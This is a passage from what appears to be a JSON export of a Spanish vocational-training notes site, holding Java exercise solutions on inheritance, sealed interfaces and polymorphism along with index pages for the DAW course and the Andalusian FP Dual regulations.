Habitacion(&quot;Sal√≥n&quot;, 20, 2));\n\t\t\n\t\t\n\t\timprimirInformacion(l1);\n\t\timprimirInformacion(c1);\n\t\timprimirInformacion(ap1);\n\t\t\n \n\t}\n\t\n\tpublic static void imprimirInformacion(Inmueble i) {\n\t\t\n\t\tif (i instanceof Local l) {\n\t\t\tSystem.out.println(&quot;LOCAL COMERCIAL&quot;);\n\t\t\timprimirInformacionComun(i);\n\t\t\tSystem.out.println(&quot;EL LOCAL %s TIENE SALIDA DE HUMOS&quot;\n\t\t\t\t\t.formatted(l.isTieneSalidaHumos() ? &quot;S√ç&quot; : &quot;NO&quot;));\n\t\t} else if (i instanceof Casa c) {\n\t\t\tSystem.out.println(&quot;CASA&quot;);\n\t\t\timprimirInformacionComun(i);\n\t\t\tSystem.out.println(&quot;N¬∫ HABITACIONES: &quot; +  c.getNumHabitaciones());\n\t\t\tSystem.out.println(&quot;N¬∫ PLANTAS: &quot; + c.getNumPisos());\n\t\t} else if (i instanceof Apartamento a) {\n\t\t\tSystem.out.println(&quot;APARTAMENTO&quot;);\n\t\t\timprimirInformacionComun(i);\n\t\t\tSystem.out.println(&quot;N¬∫ HABITACIONES: &quot; +  a.getNumHabitaciones());\t\t\t\n\t\t}\n\t\t\n\t\tSystem.out.println();\n\t}\n \n\tprivate static void imprimirInformacionComun(Inmueble i) {\n\t\tSystem.out.println(&quot;DIRECCI√ìN: &quot; + i.getDireccion());\n\t\tSystem.out.println(&quot;TAMA√ëO: %.2f m2&quot;.formatted(i.getMetrosCuadrados()));\n\t\tSystem.out.println(&quot;PRECIO FINAL: %.2f&quot;.formatted(i.precioVentaFinal()));\n\t}\n}\n \nSoluciones ejercicio 3\nProducto.java\npackage herencia;\n \npublic class Producto {\n\t\n\tprotected String nombre;\n    protected double precio;\n \n    public Producto(String nombre, double precio) {\n        this.nombre = nombre;\n        this.precio = precio;\n    }\n \n    public String getNombre() {\n        return nombre;\n    }\n \n    public double getPrecio() {\n        return precio;\n    }\n \n}\n \n \nTelefonoMovil.java\npackage herencia;\n \npublic class TelefonoMovil extends Producto {\n    private double tamanoPantalla;\n    private int cantidadRam;\n    private int cantidadAlmacenamiento;\n \n    public TelefonoMovil(String nombre, double precio, double tamanoPantalla, int cantidadRam, int cantidadAlmacenamiento) {\n        super(nombre, precio);\n        this.tamanoPantalla = tamanoPantalla;\n        this.cantidadRam = cantidadRam;\n        this.cantidadAlmacenamiento = cantidadAlmacenamiento;\n    }\n \n    public double getTamanoPantalla() {\n        return tamanoPantalla;\n    }\n \n    public int getCantidadRam() {\n        return cantidadRam;\n    }\n \n    public int getCantidadAlmacenamiento() {\n        return cantidadAlmacenamiento;\n    }\n}\nAccesorio.java\npackage herencia;\n \npublic abstract class Accesorio extends Producto {\n\t\n    protected TelefonoMovil[] telefonosCompatibles;\n    private int numTelefonosCompatibles;\n \n    public Accesorio(String nombre, double precio) {\n        super(nombre, precio);\n        telefonosCompatibles = new TelefonoMovil[10]; // Inicialmente se reserva espacio para 10 tel√©fonos\n        numTelefonosCompatibles = 0;\n    }\n    \n    public void agregarTelefonoCompatible(TelefonoMovil telefono) {\n        if (numTelefonosCompatibles &lt; telefonosCompatibles.length) {\n            telefonosCompatibles[numTelefonosCompatibles] = telefono;\n            numTelefonosCompatibles++;\n        } else {\n            System.out.println(&quot;No se pueden agregar m√°s tel√©fonos compatibles&quot;);\n        }\n    }\n \n    public TelefonoMovil[] getTelefonosCompatibles() {\n        return telefonosCompatibles.clone();\n    }\n \n\tpublic int getNumTelefonosCompatibles() {\n\t\treturn numTelefonosCompatibles;\n\t}\n    \n    \n    \n    \n}\n \nCarcasa.java\npackage herencia;\n \npublic class Carcasa extends Accesorio {\n \n\tpublic Carcasa(String nombre, double precio) {\n\t\tsuper(nombre, precio);\n\t}\n}\n \nCargador.java\npackage herencia;\n \npublic class Cargador extends Accesorio{\n \n\tpublic Cargador(String nombre, double precio) {\n\t\tsuper(nombre, precio);\n\t}\n \n}\n \n.java\npackage herencia;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t// Crear un tel√©fono m√≥vil\n\t\tTelefonoMovil telefono = new TelefonoMovil(&quot;iPhone 12&quot;, 999.99, 6.1, 4, 128);\n \n\t\t// Crear una carcasa compatible con el tel√©fono\n\t\tCarcasa carcasa = new Carcasa(&quot;Carcasa transparente&quot;, 19.99);\n\t\tcarcasa.agregarTelefonoCompatible(telefono);\n \n\t\t// Crear un cargador compatible con el tel√©fono\n\t\tCargador cargador = new Cargador(&quot;Cargador r√°pido&quot;, 29.99);\n\t\tcargador.agregarTelefonoCompatible(telefono);\n \n\t\t// Imprimir informaci√≥n del tel√©fono\n\t\tSystem.out.println(&quot;Tel√©fono: &quot; + telefono.getNombre());\n\t\tSystem.out.println(&quot;Precio: %.2f‚Ç¨&quot;.formatted(telefono.getPrecio()));\n\t\tSystem.out.println(&quot;Tama√±o de pantalla: &quot; + telefono.getTamanoPantalla() + &quot; pulgadas&quot;);\n\t\tSystem.out.println(&quot;RAM: &quot; + telefono.getCantidadRam() + &quot; GB&quot;);\n\t\tSystem.out.println(&quot;Almacenamiento: &quot; + telefono.getCantidadAlmacenamiento() + &quot; GB&quot;);\n \n\t\t// Imprimir informaci√≥n de la carcasa\n\t\tSystem.out.println(&quot;\\nCarcasa: &quot; + carcasa.getNombre());\n\t\tSystem.out.println(&quot;Precio: %.2f‚Ç¨&quot;.formatted(carcasa.getPrecio()));\n\t\tSystem.out.println(&quot;Telefonos compatibles con la carcasa:&quot;);\n\t\tTelefonoMovil[] telefonosCarcasa = carcasa.getTelefonosCompatibles();\n\t\tfor (int i = 0; i &lt; carcasa.getNumTelefonosCompatibles(); i++) {\n\t\t\tSystem.out.println(&quot;- &quot; + telefonosCarcasa[i].getNombre());\n\t\t}\n \n\t\t// Imprimir informaci√≥n del cargador\n\t\tSystem.out.println(&quot;\\nCargador: &quot; + cargador.getNombre());\n\t\tSystem.out.println(&quot;Precio: %.2f‚Ç¨&quot;.formatted(cargador.getPrecio()));\n\t\tSystem.out.println(&quot;Telefonos compatibles con el cargador:&quot;);\n\t\tTelefonoMovil[] telefonosCargador = cargador.getTelefonosCompatibles();\n\t\tfor (int i = 0; i &lt; cargador.getNumTelefonosCompatibles(); i++) {\n\t\t\tSystem.out.println(&quot;- &quot; + telefonosCargador[i].getNombre());\n\t\t}\n\t}\n \n}\n \nSoluciones ejercicio 4\nApp.java\npublic class App {\n    public static void main(String[] args) {\n        // Crear un tel√©fono m√≥vil\n        TelefonoMovil telefono = new TelefonoMovil(&quot;iPhone 12&quot;, 999.99, 6.1, 4, 128);\n        \n        // Crear una carcasa compatible con el tel√©fono\n        Carcasa carcasa = new Carcasa(&quot;Carcasa transparente&quot;, 19.99);\n        carcasa.agregarTelefonoCompatible(telefono);\n        \n        // Crear un cargador compatible con el tel√©fono\n        Cargador cargador = new Cargador(&quot;Cargador r√°pido&quot;, 29.99);\n        cargador.agregarTelefonoCompatible(telefono);\n        \n        // Imprimir informaci√≥n de los productos\n        imprimirInformacion(telefono);\n        imprimirInformacion(carcasa);\n        imprimirInformacion(cargador);\n    }\n    \n    public static void imprimirInformacion(Producto producto) {\n        System.out.println(&quot;Producto: &quot; + producto.getNombre());\n        System.out.println(&quot;Precio: $&quot; + producto.getPrecio());\n        \n        if (producto instanceof TelefonoMovil telefono) {\n            System.out.println(&quot;Tama√±o de pantalla: &quot; + telefono.getTamanoPantalla() + &quot; pulgadas&quot;);\n            System.out.println(&quot;RAM: &quot; + telefono.getCantidadRam() + &quot; GB&quot;);\n            System.out.println(&quot;Almacenamiento: &quot; + telefono.getCantidadAlmacenamiento() + &quot; GB&quot;);\n        } else if (producto instanceof Accesorio accesorio) {\n            System.out.println(&quot;Tipo de accesorio: &quot; + accesorio.getClass().getSimpleName());\n            if (accesorio instanceof Carcasa carcasa) {\n                System.out.println(&quot;Telefonos compatibles con la carcasa:&quot;);\n                for (TelefonoMovil telefonoCompat : carcasa.getTelefonosCompatibles()) {\n                    System.out.println(&quot;- &quot; + telefonoCompat.getNombre());\n                }\n            } else if (accesorio instanceof Cargador cargador) {\n                System.out.println(&quot;Telefonos compatibles con el cargador:&quot;);\n                for (TelefonoMovil telefonoCompat : cargador.getTelefonosCompatibles()) {\n                    System.out.println(&quot;- &quot; + telefonoCompat.getNombre());\n                }\n            }\n        }\n        \n        System.out.println();\n    }\n}\n "},"DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-4":{"title":"Soluciones bolet√≠n 4","links":[],"tags":[],"content":"Soluciones ejercicio 1\nValidable.java\npackage interfaces;\n \n \npublic sealed interface Validable permits Documento, Imagen, Video {\n\tboolean isValid();\n}\n \nDocumento.java\npackage interfaces;\n \npublic abstract non-sealed class Documento implements Validable {\n \n\tprotected long size;\n\t\n \n\tpublic Documento(long size) {\n\t\tthis.size = size;\n\t}\n \n\tpublic long getSize() {\n\t\treturn size;\n\t}\n \n\tpublic void setSize(long size) {\n\t\tthis.size = size;\n\t}\n \n}\n \nImagen.java\npackage interfaces;\n \npublic abstract non-sealed class Imagen implements Validable {\n\t\n\tprotected long width;\n\tprotected long height;\n \n\tpublic long getWidth() {\n\t\treturn width;\n\t}\n \n\tpublic long getHeight() {\n\t\treturn height;\n\t}\n \n\tpublic void setWidth(long width) {\n\t\tthis.width = width;\n\t}\n \n\tpublic void setHeight(long height) {\n\t\tthis.height = height;\n\t}\n \n\tpublic Imagen(long width, long height) {\n\t\tthis.width = width;\n\t\tthis.height = height;\n\t}\n \n}\n \nVideo.java\npackage interfaces;\n \npublic abstract non-sealed class Video implements Validable {\n\t\n\tprotected int length;\n \n\tpublic Video(int length) {\n\t\tthis.length = length;\n\t}\n \n\tpublic int getLength() {\n\t\treturn length;\n\t}\n \n\tpublic void setLength(int length) {\n\t\tthis.length = length;\n\t}\n \n}\n \nDocumentoPDF.java\npackage interfaces;\n \npublic class DocumentoPDF extends Documento {\n \n\tpublic DocumentoPDF(long size) {\n\t\tsuper(size);\n\t}\n \n\t@Override\n\tpublic boolean isValid() {\n\t\treturn size &gt;= 0 &amp;&amp; size &lt;= 1024*1024;\n\t}\n \n}\n \nImagenJPG.java\npackage interfaces;\n \npublic class ImagenJPG extends Imagen {\n \n\tpublic ImagenJPG(long width, long height) {\n\t\tsuper(width, height);\n\t\t\n\t}\n \n\t// Imagen &lt;= 5 Megapixels\n\t// 2,560√ó1,920 con aspect ratio 16:9\n\t\n\t@Override\n\tpublic boolean isValid() {\n\t\treturn width*height &lt;= 5_000_000;\n\t}\n \n}\n \nVideoMp4.java\npackage interfaces;\n \npublic class VideoMp4 extends Video {\n \n\tpublic VideoMp4(int length) {\n\t\tsuper(length);\n\t}\n \n\t@Override\n\tpublic boolean isValid() {\n\t\treturn length &gt; 0 &amp;&amp; length &lt; 5*60;\n\t}\n\t\n \n}\n \nServicioValidacion.java\npackage interfaces;\n \npublic class ServicioValidacion {\n\t\n\tprivate Validable[] validables;\n\tprivate int cantidadValidables;\n\t\n\tpublic ServicioValidacion() {\n\t\tvalidables = new Validable[10];\n\t\tcantidadValidables = 0;\n\t}\n\t\n\tpublic ServicioValidacion(int length) {\n\t\tvalidables = new Validable[length];\n\t\tcantidadValidables = 0;\n\t}\n\t\n\tpublic ServicioValidacion(Validable[] array) {\n\t\tvalidables = array.clone();\n\t\tcantidadValidables = array.length;\n\t}\n \n\tpublic boolean validarTodos() {\n\t\tboolean resultado = true;\n\t\tfor(int i = 0; i &lt; cantidadValidables; i++) {\n\t\t\tresultado = resultado &amp;&amp; validables[i].isValid();\n\t\t}\n\t\treturn resultado;\n\t}\n\t\n\tpublic static boolean validar(Validable v) {\n\t\treturn v.isValid();\n\t}\n}\n \nApp.java\npackage interfaces;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n \n\t\tDocumento d1 = new DocumentoPDF(12345l);\n\t\tDocumento d2 = new DocumentoPDF(12345678912343l);\n\t\t\n\t\tImagen im = new ImagenJPG(2500, 1900);\n\t\t\n\t\tVideo v = new VideoMp4(123);\n\t\t\n\t\tValidable[] arr = {d1, d2, im, v};\n\t\t\n\t\tServicioValidacion servicioValidacion =\n\t\t\t\tnew ServicioValidacion(arr);\n\t\t\n\t\tif (servicioValidacion.validarTodos())\n\t\t\tSystem.out.println(&quot;Todos los ficheros son v√°lidos&quot;);\n\t\telse\n\t\t\tSystem.out.println(&quot;Hay alg√∫n fichero que no es v√°lido&quot;);\n\t\t\n\t}\n \n}\n \nSoluciones ejercicio 2\nVendible.java\npublic interface Vendible {\n\t double getPrecio();\n}\nProducto.java\n \npublic class Producto implements Vendible {\n\t private String nombre;\n\t private String categoria;\n\t private double precio;\n \n\t public Producto(String nombre, String categoria, double precio) {\n\t     this.nombre = nombre;\n\t     this.categoria = categoria;\n\t     this.precio = precio;\n\t }\n \n\t @Override\n\t public double getPrecio() {\n\t     return precio;\n\t }\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic String getCategoria() {\n\t\treturn categoria;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic void setCategoria(String categoria) {\n\t\tthis.categoria = categoria;\n\t}\n \n\tpublic void setPrecio(double precio) {\n\t\tthis.precio = precio;\n\t}\n\t \n\t \n}\n \nServicio.java\n \npublic class Servicio implements Vendible {\n\tprivate String nombre;\n\tprivate String tipo;\n\tprivate int duracionMinutos;\n \n\tpublic Servicio(String nombre, String tipo, int duracionMinutos) {\n\t\tthis.nombre = nombre;\n\t\tthis.tipo = tipo;\n\t\tthis.duracionMinutos = duracionMinutos;\n\t}\n \n\t@Override\n\tpublic double getPrecio() {\n\t\tdouble precioMinuto = switch (tipo) {\n\t\tcase &quot;PINTURA&quot; -&gt; 0.75;\n\t\tcase &quot;ELECTRICIDAD&quot; -&gt; 1.0;\n\t\tcase &quot;FONTANER√çA&quot; -&gt; 1.25;\n\t\tdefault -&gt; 1.5;\n\t\t};\n\t\treturn precioMinuto * duracionMinutos;\n\t}\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic String getTipo() {\n\t\treturn tipo;\n\t}\n \n\tpublic int getDuracionMinutos() {\n\t\treturn duracionMinutos;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic void setTipo(String tipo) {\n\t\tthis.tipo = tipo;\n\t}\n \n\tpublic void setDuracionMinutos(int duracionMinutos) {\n\t\tthis.duracionMinutos = duracionMinutos;\n\t}\n\t\n\t\n \n}\n \nFactura.java\npackage interfaces;\n \npublic class Factura {\n\tprivate String cliente;\n\tprivate Vendible[] elementos;\n \n\tpublic Factura(String cliente, Vendible[] elementos) {\n\t\tthis.cliente = cliente;\n\t\tthis.elementos = elementos;\n\t}\n \n\tpublic double calcularTotal() {\n\t\tdouble total = 0.0;\n\t\tfor (Vendible vendible : elementos) {\n\t\t\ttotal += vendible.getPrecio();\n\t\t}\n\t\treturn total;\n\t}\n \n\tpublic String getCliente() {\n\t\treturn cliente;\n\t}\n \n\tpublic Vendible[] getElementos() {\n\t\treturn elementos;\n\t}\n \n\tpublic void setCliente(String cliente) {\n\t\tthis.cliente = cliente;\n\t}\n \n\tpublic void setElementos(Vendible[] elementos) {\n\t\tthis.elementos = elementos;\n\t}\n \n}\n \nApp.java\npackage interfaces;\n \npublic class App {\n\t public static void main(String[] args) {\n\t     Producto producto1 = new Producto(&quot;Tornillo&quot;, &quot;Ferreter√≠a&quot;, 0.5);\n\t     Producto producto2 = new Producto(&quot;Martillo&quot;, &quot;Herramienta&quot;, 10.0);\n\t     Servicio servicio1 = new Servicio(&quot;Pintura de paredes&quot;, &quot;PINTURA&quot;, 120);\n\t     Servicio servicio2 = new Servicio(&quot;Reparaci√≥n el√©ctrica&quot;, &quot;ELECTRICIDAD&quot;, 60);\n \n\t     Vendible[] elementos = {producto1, producto2, servicio1, servicio2};\n \n\t     Factura factura = new Factura(&quot;Cliente Ejemplo&quot;, elementos);\n \n\t     double total = factura.calcularTotal();\n\t     System.out.println(&quot;Total de la factura: &quot; + total + &quot;‚Ç¨&quot;);\n\t }\n \n\t\n}\n \n \nSoluciones ejercicio 3\nFichero.java\npublic interface Fichero {\n\t\n\tString getNombre();\n\t\n\tString getFormato();\n \n}\n \nFicheroAbstracto.java\npublic abstract class FicheroAbstracto implements Fichero {\n \n\tprotected String nombre;\n\tprotected String formato;\n\t\n\t\n\tpublic FicheroAbstracto(String nombre, String formato) {\n\t\tthis.nombre = nombre;\n\t\tthis.formato = formato;\n\t}\n \n\t@Override\n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\t@Override\n\tpublic String getFormato() {\n\t\treturn formato;\n\t}\n \n}\n \nReproducible.java\npublic interface Reproducible extends Fichero {\n\t\n\tvoid reproducir();\n\t\n\tint getDuracion();\n\t\n \n}\n \nFicheroPDF.java\npublic class FicheroPDF extends FicheroAbstracto {\n \n\tpublic FicheroPDF(String nombre) {\n\t\tsuper(nombre, &quot;PDF&quot;);\n\t}\n \n}\nImagenJPG.java\npublic class ImagenJPG extends FicheroAbstracto implements Reproducible {\n \n\tpublic ImagenJPG(String nombre) {\n\t\tsuper(nombre, &quot;JPG&quot;);\n\t}\n \n\t@Override\n\tpublic void reproducir() {\n\t\tSystem.out.println(&quot;Mostrando la imagen JPG durante 7 segundos&quot;);\n\t}\n \n\t@Override\n\tpublic int getDuracion() {\n\t\treturn 7;\n\t}\n \n}\nAudioMp3.java\npublic class AudioMp3 extends FicheroAbstracto implements Reproducible {\n \n\tprivate int duracion;\n\t\n\tpublic AudioMp3(String nombre, int duracion) {\n\t\tsuper(nombre, &quot;MP3&quot;);\n\t\tthis.duracion = duracion;\n\t}\n \n\t@Override\n\tpublic void reproducir() {\n\t\tSystem.out.println(&quot;Reproduciendo todo el contenido del fichero&quot;);\n\t\t\n\t}\n \n\t@Override\n\tpublic int getDuracion() {\n\t\treturn duracion;\n\t}\n \n}\n \nVideoH264.java\npublic class VideoH264 extends FicheroAbstracto implements Reproducible {\n \n\tprivate int duracion;\n\t\n\tpublic VideoH264(String nombre, int duracion) {\n\t\tsuper(nombre, &quot;H.264&quot;);\n\t}\n \n\t@Override\n\tpublic void reproducir() {\n\t\tSystem.out.println(&quot;Reproduciendo todo el contenido del v√≠deo&quot;);\n\t\t\n\t}\n \n\t@Override\n\tpublic int getDuracion() {\n\t\treturn duracion;\n\t}\n\t\n\t\n \n}\nReproductor.java\npublic interface Reproductor {\n\t\n\tvoid cargar(Reproducible r);\n\t\n\tvoid reproducir();\n\t\n\tdefault void reproducir(Reproducible r) {\n\t\tr.reproducir();\n\t}\n\t\n\tvoid parar();\n\t\n\t\n \n}\nReproductorMultimedia.java\npublic class ReproductorMultimedia implements Reproductor{\n\t\n\tprivate Reproducible actual;\n\tprivate Reproducible[] lista;\n\tprivate int cantidadReproducibles;\n\t\n\t\n\tpublic ReproductorMultimedia() {\n\t\tcantidadReproducibles = 0;\n\t}\n\t\n\tpublic ReproductorMultimedia(Reproducible[] lista) {\n\t\tthis.lista = lista;\n\t\tcantidadReproducibles = lista.length;\n\t\tactual = lista[0];\n\t}\n\t\n \n\t@Override\n\tpublic void cargar(Reproducible r) {\n\t\tactual = r;\n\t\t\n\t}\n \n\t@Override\n\tpublic void reproducir() {\n\t\tthis.reproducir(actual);\n\t\t\n\t}\n \n\t@Override\n\tpublic void parar() {\n\t\tactual = null;\t\n\t}\n \n}\n \nApp.java\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\t\n\t\tVideoH264 v = new VideoH264(&quot;Avengers Endgame&quot;, 182*60);\n\t\tAudioMp3 a = new AudioMp3(&quot;19 D√≠as y 500 noches - Joaqu√≠n Sabina&quot;, 277);\n\t\tImagenJPG i = new ImagenJPG(&quot;foto vacaciones&quot;);\n\t\tFicheroPDF f = new FicheroPDF(&quot;Nomina&quot;);\n\t\t\n\t\tReproductor r = new ReproductorMultimedia();\n\t\t\n\t\tr.cargar(v);\n\t\tr.reproducir();\n\t\t\n\t\tr.cargar(a);\n\t\tr.reproducir();\n\t\t\n\t\tr.cargar(i);\n\t\tr.reproducir();\n\t\t\n\t\t//r.cargar(f); // Error\n \n\t}\n \n}\n \nSoluciones ejercicio 4\nValorable.java\npublic interface Valorable {\n\t\n\tdouble getPuntuacionMedia();\n \n}\nValoracion.java\npublic class Valoracion {\n\t\n\tprivate Usuario usuario;\n\tprivate Valorable valorable;\n\tprivate int puntuacion;\n\t\n\t\n\tpublic Valoracion(Usuario usuario, Valorable valorable, int puntuacion) {\n\t\tthis.usuario = usuario;\n\t\tthis.valorable = valorable;\n\t\tthis.puntuacion = puntuacion;\n\t}\n \n \n\tpublic Usuario getUsuario() {\n\t\treturn usuario;\n\t}\n \n \n\tpublic void setUsuario(Usuario usuario) {\n\t\tthis.usuario = usuario;\n\t}\n \n \n\tpublic Valorable getValorable() {\n\t\treturn valorable;\n\t}\n \n \n\tpublic void setValorable(Valorable valorable) {\n\t\tthis.valorable = valorable;\n\t}\n \n \n\tpublic int getPuntuacion() {\n\t\treturn puntuacion;\n\t}\n \n \n\tpublic void setPuntuacion(int puntuacion) {\n\t\tthis.puntuacion = puntuacion;\n\t}\t\n \n}\n \nUsuario.java\npublic class Usuario {\n\t\n\tprivate String username;\n\tprivate String email;\n\tprivate Valoracion[] valoraciones;\n\tprivate int cantidadValoraciones;\n\t\n\t\n\tpublic Usuario(String username) {\n\t\tthis.username = username;\n\t\tcantidadValoraciones = 0;\n\t\tvaloraciones = new Valoracion[10];\n\t}\n\t\n\tpublic Usuario(String username, String email) {\n\t\tthis(username);\n\t\tthis.email = email;\n\t}\n\t\n\tpublic void agregarValoracion(Valoracion valoracion) {\n        if (cantidadValoraciones &lt; valoraciones.length) {\n            valoraciones[cantidadValoraciones] = valoracion;\n            cantidadValoraciones++;\n        } else {\n            System.out.println(&quot;No se pueden agregar m√°s valoraciones&quot;);\n        }\n    }\n \n\tpublic String getUsername() {\n\t\treturn username;\n\t}\n \n\tpublic void setUsername(String username) {\n\t\tthis.username = username;\n\t}\n \n\tpublic String getEmail() {\n\t\treturn email;\n\t}\n \n\tpublic void setEmail(String email) {\n\t\tthis.email = email;\n\t}\n \n\tpublic Valoracion[] getValoraciones() {\n\t\treturn valoraciones.clone();\n\t}\n \n\tpublic int getCantidadValoraciones() {\n\t\treturn cantidadValoraciones;\n\t}\t\n \n}\n \nValorableAbstracto.java\npublic class ValorableAbstracto implements Valorable {\n\t\n\tprivate Valoracion[] valoraciones;\n\tprivate int cantidadValoraciones;\n\t\n\tpublic ValorableAbstracto() {\n\t\tvaloraciones = new Valoracion[10];\n\t\tcantidadValoraciones = 0;\n\t}\n\t\n\tpublic void agregarValoracion(Valoracion valoracion) {\n        if (cantidadValoraciones &lt; valoraciones.length) {\n            valoraciones[cantidadValoraciones] = valoracion;\n            cantidadValoraciones++;\n        } else {\n            System.out.println(&quot;No se pueden agregar m√°s valoraciones&quot;);\n        }\n    }\n\t\n \n\t@Override\n\tpublic double getPuntuacionMedia() {\n\t\tdouble puntuacion = 0.0;\n\t\tfor(int i = 0; i &lt; cantidadValoraciones; i++)\n\t\t\tpuntuacion += valoraciones[i].getPuntuacion();\n\t\t\n\t\treturn puntuacion/cantidadValoraciones;\n\t}\n \n}\n \nServicioValoracion.java\npublic class ServicioValoracion {\n\t\n\tpublic static void valorar(Usuario usuario, Valorable valorable, int puntuacion) {\n        Valoracion valoracion = new Valoracion(usuario, valorable, puntuacion);\n        usuario.agregarValoracion(valoracion);\n        \n        if (valorable instanceof ValorableAbstracto valorableAbstracto) {\n            valorableAbstracto.agregarValoracion(valoracion);\n        }\n    }\n \n}\n \nProducto.java\npublic class Producto extends ValorableAbstracto {\n\t\n\tprivate String nombre, categoria;\n\tprivate double precio;\n\t\n\t\n\tpublic Producto(String nombre, String categoria, double precio) {\n\t\tsuper();\n\t\tthis.nombre = nombre;\n\t\tthis.categoria = categoria;\n\t\tthis.precio = precio;\n\t}\n \n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n \n\tpublic String getCategoria() {\n\t\treturn categoria;\n\t}\n \n \n\tpublic void setCategoria(String categoria) {\n\t\tthis.categoria = categoria;\n\t}\n \n \n\tpublic double getPrecio() {\n\t\treturn precio;\n\t}\n \n \n\tpublic void setPrecio(double precio) {\n\t\tthis.precio = precio;\n\t}\n}\n \nNegocio.java\npublic class Negocio extends ValorableAbstracto {\n\t\n\tprivate String nombre, ciudad;\n \n\tpublic Negocio(String nombre, String ciudad) {\n\t\tsuper();\n\t\tthis.nombre = nombre;\n\t\tthis.ciudad = ciudad;\n\t}\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n \n\tpublic String getCiudad() {\n\t\treturn ciudad;\n\t}\n \n\tpublic void setCiudad(String ciudad) {\n\t\tthis.ciudad = ciudad;\n\t}\n \n}\n \nCiudad.java\npublic class Ciudad extends ValorableAbstracto {\n\t\n\tprivate String nombre, pais;\n \n\tpublic Ciudad(String nombre, String pais) {\n\t\tsuper();\n\t\tthis.nombre = nombre;\n\t\tthis.pais = pais;\n\t}\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic String getPais() {\n\t\treturn pais;\n\t}\n \n\tpublic void setPais(String pais) {\n\t\tthis.pais = pais;\n\t}\n\t\n\t\n \n}\n \nApp.java\npublic class App {\n \n\tpublic static void main(String[] args) {\n        // Crear usuarios\n        Usuario usuario1 = new Usuario(&quot;Usuario1&quot;);\n        Usuario usuario2 = new Usuario(&quot;Usuario2&quot;);\n \n        // Crear productos\n        Producto producto1 = new Producto(&quot;Producto1&quot;, &quot;Categor√≠a1&quot;, 10.99);\n        Producto producto2 = new Producto(&quot;Producto2&quot;, &quot;Categor√≠a2&quot;, 19.99);\n \n        // Crear negocios\n        Negocio negocio1 = new Negocio(&quot;Mi tienda&quot;, &quot;Sevilla&quot;);\n        Negocio negocio2 = new Negocio(&quot;El Gran Bazar&quot;, &quot;Madrid&quot;);\n       \n        // Crear una ciudad\n        Ciudad ciudad1 = new Ciudad(&quot;Sevilla&quot;, &quot;Espa√±a&quot;);\n        \n        // Valorar productos, negocios o ciudades\n        ServicioValoracion.valorar(usuario1, producto1, 4);\n        ServicioValoracion.valorar(usuario2, producto2, 3);\n \n        ServicioValoracion.valorar(usuario1, negocio1, 3);\n        ServicioValoracion.valorar(usuario2, negocio2, 4);\n        \n        ServicioValoracion.valorar(usuario1, ciudad1, 5);\n        ServicioValoracion.valorar(usuario2, ciudad1, 4);\n        \n        \n        // Imprimir la puntuaci√≥n media de los productos, negocios y ciudades\n        System.out.println(&quot;Puntuaci√≥n media de &quot; + producto1.getNombre() + &quot;: &quot; + producto1.getPuntuacionMedia());\n        System.out.println(&quot;Puntuaci√≥n media de &quot; + producto2.getNombre() + &quot;: &quot; + producto2.getPuntuacionMedia());\n        System.out.println(&quot;Puntuaci√≥n media de &quot; + negocio1.getNombre() + &quot;: &quot; + negocio1.getPuntuacionMedia());\n        System.out.println(&quot;Puntuaci√≥n media de &quot; + negocio2.getNombre() + &quot;: &quot; + negocio2.getPuntuacionMedia());\n        System.out.println(&quot;Puntuaci√≥n media de &quot; + ciudad1.getNombre() + &quot;: &quot; + ciudad1.getPuntuacionMedia());\n    }\n \n}\n "},"DAW/index":{"title":"DAW","links":["DAW/Despliegue-de-aplicaciones-web/","DAW/Desarrollo-web-entorno-cliente/","DAW/Bases-de-datos/","DAW/Entornos-de-desarrollo/"],"tags":["DAW","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nMateriales preparados para el Ciclo Formativo de Grado Superior de Desarrollo de Aplicaciones Web (DAW)\nInformaci√≥n:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/des-aplicaciones-web.html\n\nTemario de cada m√≥dulo profesional:\n\nDespliegue de Aplicaciones Web: DAWeb\nDesarrollo Web Entorno Cliente: DWEC\nBases de Datos: BBDD\nEntornos de Desarrollo: ED\n"},"FP-Dual/Normativa":{"title":"FP Dual Andaluc√≠a","links":["FP-Dual/240626_Instrucciones_DGFP_Andalucia.pdf","FP-Dual/241112_Guia_Organizacion_FFEOE.pdf","FP-Dual/241112_PRESENTACION_Guia_v014.pdf","FP-Dual/Modelo-solicitud-falta-puesto-formativos(F).pdf","FP-Dual/Preguntas_Implantaci√≥n-nueva-FP_2024_25.pdf"],"tags":["FP","Dual","Normativa","Andaluc√≠a"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nRecopilaci√≥n de distintas normativas:\n\n240626_Instrucciones_DGFP_Andalucia.pdf\n241112_Guia_Organizacion_FFEOE.pdf\n241112_PRESENTACION_Guia_v014.pdf\nModelo solicitud falta puesto formativos(F).pdf\nPreguntas_Implantaci√≥n nueva FP_2024_25.pdf\n"},"FP-Dual/index":{"title":"FP Dual 